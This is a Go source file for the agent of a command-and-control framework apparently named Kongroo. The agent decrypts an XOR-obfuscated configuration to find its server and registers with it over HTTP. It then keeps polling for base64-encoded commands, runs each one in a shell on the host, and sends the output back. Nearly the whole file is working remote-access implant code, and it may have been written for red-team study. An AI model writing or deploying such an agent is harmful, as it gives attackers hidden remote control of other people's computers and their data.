package main

import (
	"bytes"
	b64 "encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"

	"gitlab.com/mgdi/kongroo-c2/agent/config"
)

type command struct {
	task   string
	result string
}

func encryptDecrypt(input string, key int) (output string) {
	for i := 0; i < len(input); i++ {
		if input[i] == 0x00 {
			break
		}
		output += string(input[i] ^ byte(key))
	}
	return output
}
func registerKongrooAgent(hostname, pcname, platform string) {

	httpposturl := "http://" + hostname + ":8080/reg/" + pcname
	var jsonData = []byte(fmt.Sprintf(`{
		"Name": "%s",
		"IP": "",
		"Platform": "%s"
	}`, pcname, platform))
	request, err := http.NewRequest("POST", httpposturl, bytes.NewBuffer(jsonData))
	request.Header.Set("Content-Type", "application/json; charset=UTF-8")

	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		panic(err)
	}
	defer response.Body.Close()
	fmt.Println("response Status:", response.Status)
	fmt.Println("response Headers:", response.Header)
	body, _ := ioutil.ReadAll(response.Body)
	fmt.Println("response Body:", string(body))
}
func checkNewTasks(hostname, pcname string) (string, bool) {
	resp, err := http.Get("http://" + hostname + ":8080/tasks/" + pcname)
	if err != nil {
		log.Fatalln(err)
	}
	if resp.StatusCode == 404 {
		return "", false
	}
	//We Read the response body on the line below.
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		// log.Fatal(err)

		return "", false
	}
	//Convert the body to type string
	if len(body) == 0 {
		return "", false
	}
	body = body[:]
	sEnc := string(body)
	sDec, _ := b64.StdEncoding.DecodeString(sEnc)
	log.Printf(string(sDec))
	return string(sDec), true

}
func executeTask(task, platform string) command {
	var result []byte
	var err error

	switch platform {
	case "MacOS":
		splitTask := strings.Split(task, " ")
		result, err = exec.Command(splitTask[0], splitTask[1:]...).CombinedOutput()
		log.Println("Result of command", string(result), "error", err)
	case "Windows":
		result, _ = exec.Command("cmd", "/c", task).CombinedOutput()
	default:
		result = []byte("")

	}

	sEnc := b64.StdEncoding.EncodeToString(result)
	taskResult := command{
		task:   task,
		result: string(sEnc),
	}
	log.Println("Sending", taskResult.result)
	return taskResult
}

func postResults(hostname, pcname string, result command) {
	httpposturl := "http://" + hostname + ":8080/tasks/" + pcname
	var jsonData = []byte(fmt.Sprintf(`{
		"Command": "%s",
		"Output": "%s"
	}`, result.task, string(result.result)))

	request, _ := http.NewRequest("POST", httpposturl, bytes.NewBuffer(jsonData))
	request.Header.Set("Content-Type", "application/json; charset=UTF-8")

	client := &http.Client{}
	_, err := client.Do(request)

	if err != nil {
		panic(err)
	}
	// _, err := http.Post("http://"+hostname+"/tasks/"+pcname,
	// 	"application/x-www-form-urlencoded",
	// 	strings.NewReader(b64.StdEncoding.EncodeToString(result)))
	// if err != nil {
	// 	fmt.Println(err)
	// }

}
func changeDirectory(dir string) {
	os.Chdir(dir)
}
func main() {
	decrypted := encryptDecrypt(config.CONF_BUFFER, 75)
	var configs config.Config
	json.Unmarshal([]byte(decrypted), &configs)
	/*
		k, err := registry.OpenKey(registry.LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows NT\CurrentVersion', registry.QUERY_VALUE)
		if err != nil {
			log.Fatal(err)
		}
		defer k.Close()
		platform, _, err := k.GetStringValue("CurrentVersion")
		if err != nil {
			log.Fatal(err)
		}
	*/
	platform := "MacOS"
	pcname := "DESKTOP2"
	//Register new agent
	registerKongrooAgent(configs.Hostname, pcname, platform)
	sleepTimer := 2
	for {
		if task, ok := checkNewTasks(configs.Hostname, pcname); ok == true {
			if splitTask := strings.Split(task, " "); splitTask[0] == "cd" {
				changeDirectory(strings.Join(splitTask[1:], " "))
			} else {
				result := executeTask(task, platform)
				postResults(configs.Hostname, pcname, result)
			}
			if sleepTimer > 3 {
				sleepTimer -= 2
			}

		} else if sleepTimer < 10 {
			sleepTimer += 2
		}
		time.Sleep(time.Duration(sleepTimer) * time.Second)
	}
}
